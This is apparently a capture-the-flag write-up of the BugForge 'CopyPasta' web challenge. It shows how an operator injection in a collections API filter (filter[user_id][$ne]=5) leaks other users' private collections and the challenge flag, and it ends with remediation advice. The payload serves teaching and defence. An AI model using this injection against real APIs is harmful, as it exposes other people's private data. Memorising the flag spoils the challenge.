# CopyPasta — Check your filters.

## Overview

- **Challenge:** CopyPasta
- **Platform:** BugForge
- **Category:** Web Security
- **Vulnerability:** Filter Injection / Improper Query Filter Validation
- **Difficulty:** Not specified
- **Status:** Solved

## Objective

Investigate the CopyPasta web application, identify a weakness in its collection filtering functionality, and retrieve the challenge flag.

### Hint

> Check your filters.

## Tools Used

- Mozilla Firefox Developer Tools
- Burp Suite — Proxy and Repeater
- Browser Network Inspector

## 1. Account Registration

I registered a new account using the application's registration functionality.

**Endpoint:**

```http
POST /api/register
```

**Request body:**

```json
{
  "username": "test",
  "email": "test@mail.com",
  "password": "qwerty",
  "full_name": ""
}
```

The server returned HTTP `200` and issued a JWT authentication token.

The response included the newly created user's information:

```json
{
  "user": {
    "id": 5,
    "username": "test",
    "email": "test@mail.com",
    "full_name": "",
    "role": "user"
  }
}
```

I used this account to explore the application while monitoring requests in the browser's Network tab.

## 2. Collection Enumeration

While navigating to the Collections page and selecting the public collections filter, I observed the following request:

```http
GET /api/collections?filter[visibility]=public
```

The application used query parameters to filter collection records.

I then created a collection to understand the API's behavior.

**Endpoint:**

```http
POST /api/collections
```

**Request body:**

```json
{
  "name": "Test",
  "description": "",
  "is_public": false
}
```

The server responded with:

```json
{
  "id": 4,
  "slug": "e05a8271-eb85-4211-bda8-95393f5f2d03",
  "message": "Collection created successfully"
}
```

A subsequent request to `GET /api/collections` returned the newly created collection with `user_id: 5` and `visibility: "private"`.

## 3. Testing Filter Parameters

I experimented with different filter parameters to understand which fields the API supported.

### Name filter

```http
GET /api/collections?filter[name]=Test
```

**Result:** Returned the collection named `Test`.

### Slug filter

```http
GET /api/collections?filter[slug]=e05a8271-eb85-4211-bda8-95393f5f2d03
```

**Result:** Returned the collection matching the supplied slug.

### ID filter

```http
GET /api/collections?filter[id]=4
```

**Result:** Returned an empty array.

### User ID filter

```http
GET /api/collections?filter[user_id]=5
```

**Result:** Returned an empty array.

These results suggested that the endpoint handled different filter parameters inconsistently. However, the exact reason for the empty responses was not established at this stage.

## 4. Discovering the Filter Injection

The challenge hint, *“Check your filters,”* prompted me to investigate how the backend handled nested filter parameters and query operators.

I modified the `user_id` filter to include the `$ne` operator.

**Vulnerable request:**

```http
GET /api/collections?filter[user_id][$ne]=5
```

The `$ne` operator commonly represents “not equal” in MongoDB-style query syntax.

Instead of returning an empty result, the endpoint returned multiple collection records belonging to different users, including private administrative collections.

### Important response data

The response included the following records:

| Collection ID | Name | Owner ID | Visibility |
|---|---|---|---|
| 4 | Test | 5 | Private |
| 3 | Ops Runbooks | 1 | Private |
| 2 | Admin Toolbox | 1 | Public |
| 1 | JS Essentials | 2 | Public |

The response also exposed a `flag` field in the returned records.

This demonstrated that manipulating the filter allowed access to collection data that was not restricted to my own account.

## 5. Flag

The challenge flag was recovered from the API response:

```text
bug{JCFX6ntLHNeYwOVxrN7yQhvAeEVXSHVH}
```

## 6. Root Cause Analysis

The observed behavior is consistent with improper validation of client-controlled filter parameters.

The application accepted a nested operator in the `user_id` filter and returned records belonging to other users. This suggests that the backend may have interpreted the supplied parameter as a query operator instead of treating it strictly as a user ID value.

The exact internal query construction was not directly inspected, so the specific backend implementation remains unconfirmed.

### Security impact

- Unauthorized disclosure of other users' collections.
- Exposure of private collection metadata.
- Disclosure of administrative collection information.
- Exposure of sensitive data embedded in API responses, including the challenge flag.

## 7. Recommended Remediation

1. **Validate filter parameters:** Allow only explicitly supported fields and expected data types.
2. **Reject unexpected operators:** Do not allow users to introduce arbitrary nested query operators through HTTP parameters.
3. **Enforce authorization server-side:** Restrict private collections to their owners or explicitly authorized users.
4. **Separate filtering from authorization:** A client-supplied filter must never determine whether a user is permitted to access a record.
5. **Limit API response fields:** Return only the information required by the requesting user.
6. **Add security regression tests:** Verify that manipulated filters cannot disclose another user's private collections.

## 8. Lessons Learned

- Browser Network tools and Burp Suite can reveal undocumented API behavior.
- Testing individual filter parameters helps identify inconsistencies in backend filtering.
- Nested query operators may introduce injection risks when accepted without validation.
- Authorization must be enforced independently of collection filters.
- API responses should be examined carefully for unintended data exposure.

## Conclusion

The CopyPasta challenge was solved by investigating the collection API and discovering that the `user_id` filter accepted an operator-based query:

```http
GET /api/collections?filter[user_id][$ne]=5
```

This caused the endpoint to return collections belonging to multiple users, exposing private collection data and the challenge flag.

The exercise demonstrates the importance of strict filter validation, secure query construction, and server-side authorization checks.